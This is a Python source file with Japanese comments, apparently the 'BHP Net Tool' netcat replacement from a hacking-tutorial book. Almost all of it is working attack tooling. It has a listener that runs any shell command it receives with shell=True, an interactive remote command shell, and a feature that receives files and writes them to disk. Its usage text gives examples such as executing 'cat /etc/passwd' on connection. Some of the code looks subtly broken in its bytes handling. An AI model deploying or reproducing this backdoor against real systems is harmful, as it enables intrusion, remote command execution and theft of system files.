#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import socket
import getopt
import threading
import subprocess

# グローバル変数の定義
listen = False
command = False
upload = False
execute = ''
target = ''
upload_destination = ''
port = 0


def usage():
    print('BHP Net Tool')
    print('')
    print('Usage: bhnet.py -t target_host -p port')
    print('-l --listen              - listen on [host]:[port] for')
    print('                           incoming connections')
    print('-e --execute=file_to_run - execute the given file upon')
    print('                           receiving a connection')
    print('-c --command             - initialize a command shell')
    print('-u --upload=destination  - upon receiving connection upload a')
    print('                           file and write to [destination]')
    print('')
    print('')
    print('Examples: ')
    print('bhnet.py -t 192.168.0.1 -p 5555 -l -c')
    print('bhnet.py -t 192.168.0.1 -p 5555 -l -u c:\\target.exe')
    print('bhnet.py -t 192.168.0.1 -p 5555 -l -e \"cat /etc/passwd\"')
    print('echo \'ABCDEFGHI\' | ./bhnet.py -t 192.168.11.12 -p 135')
    sys.exit(0)


def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        usage()

    # コマンドラインオプションの読み込み
    try:
        opts, args = getopt.getopt(
            sys.argv[1:],
            'hle:t:p:cu:',
            ['help', 'listen', 'execute=', 'target=',
             'port=', 'command', 'upload='])
    except getopt.GetoptError as err:
        print(str(err))
        usage()

    for opt, arg in opts:
        if opt in ('-h', '--help'):
            usage()
        elif opt in ('-l', '--listen'):
            listen = True
        elif opt in ('-e', '--execute'):
            execute = arg
        elif opt in ('-c', '--commandshell'):
            command = True
        elif opt in ('-u', '--upload'):
            upload_destination = arg
        elif opt in ('-t', '--target'):
            target = arg
        elif opt in ('-p', '--port'):
            port = int(arg)
        else:
            assert False, 'Unhandled Option'

    # 接続を待機する? それとも標準入力からデータを受け取って送信する?
    if not listen and len(target) and port > 0:
        # コマンドラインからの入力を`buffer`に格納する。
        # 入力がこないと処理が継続されないので
        # 標準入力にデータを送らない場合はCtrl-Dを入力すること。
        buffer = sys.stdin.read()

        # データ送信
        client_sender(buffer)

    # 接続待機を開始。
    # コマンドラインオプションに応じて、ファイルアップロード
    # コマンド実行、コマンドシェルの実行を行う
    if listen:
        server_loop()


def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # 標的ホストへの接続
        client.connect((target, port))

        if len(buffer):
            client.send(buffer.encode('utf-8'))

        while True:
            # 標的ホストからのデータを待機
            recv_len = 1
            response = b''

            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += data

                if recv_len < 4096:
                    break

            print(response.decode('utf-8'))

            # 追加の入力を待機
            buffer = input('')
            buffer += '\n'

            # データの送信
            client.send(buffer.encode('utf-8'))

    except:
        print('[*] Exception! Existing.')

        # 接続の終了
        client.close()


def server_loop():
    global target

    # 待機するIPアドレスが指定されていない場合は
    # すべてのインタフェースで接続を待機
    if not len(target):
        target = '0.0.0.0'

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))

    server.listen(5)

    while True:
        client_socket, addr = server.accept()

        # クライアントからの新しい接続を処理するスレッドの起動
        client_thread = threading.Thread(
            target=client_handler,
            args=(client_socket,))
        client_thread.start()


def run_command(command):
    # 文字列をの末尾の改行を削除
    command = command.rstrip()

    # コマンドを実行し出力結果を取得
    try:
        output = subprocess.check_output(
            command, stderr=subprocess.STDOUT, shell=True)
    except:
        output = 'Failed to execute command.\r\n'

    # 出力結果をクライアントに送信
    return output


def client_handler(client_socket):
    global upload
    global execute
    global command

    # ファイルアップロードを指定されているかの確認
    if len(upload_destination):

        # すべてのデータを読み取り、指定されたファイルにデータを書き込み
        file_buffer = b''

        # 受信データが無くなるまでデータ受信を継続
        while True:
            data = client_socket.recv(1024)

            if len(data) == 0:
                break
            else:
                file_buffer += data

        # 受信したデータをファイルに書き込み
        try:
            with open(upload_destination, 'wb') as file_descriptor:
                file_descriptor.write(file_buffer)
            client_socket.send(
                'Successfully saved file to %s\r\n'.encode(
                    'utf-8') % upload_destination)
        except:
            client_socket.send(
                'Failed to save file to %s\r\n'.encode(
                    'utf-8') % upload_destination)

    # コマンド実行を指定されているかどうかの確認
    if len(execute):
        # コマンドの実行
        output = run_command(execute)

        client_socket.send(output.encode('utf-8'))

    # コマンドシェルの実行を指定されている場合の処理
    if command:

        # プロンプトの表示
        prompt = '<BHP:#> '
        client_socket.send(prompt.encode('utf-8'))

        while True:

            # 改行(エンターキー)を受け取るまでデータを受信
            cmd_buffer = ''
            while '\n' not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024).decode('utf-8')

            # コマンドの実行結果を取得
            response = run_command(cmd_buffer).decode('utf-8')
            response += prompt

            # コマンドの実行結果を送信
            client_socket.send(response.encode('utf-8'))


if __name__ == '__main__':
    main()
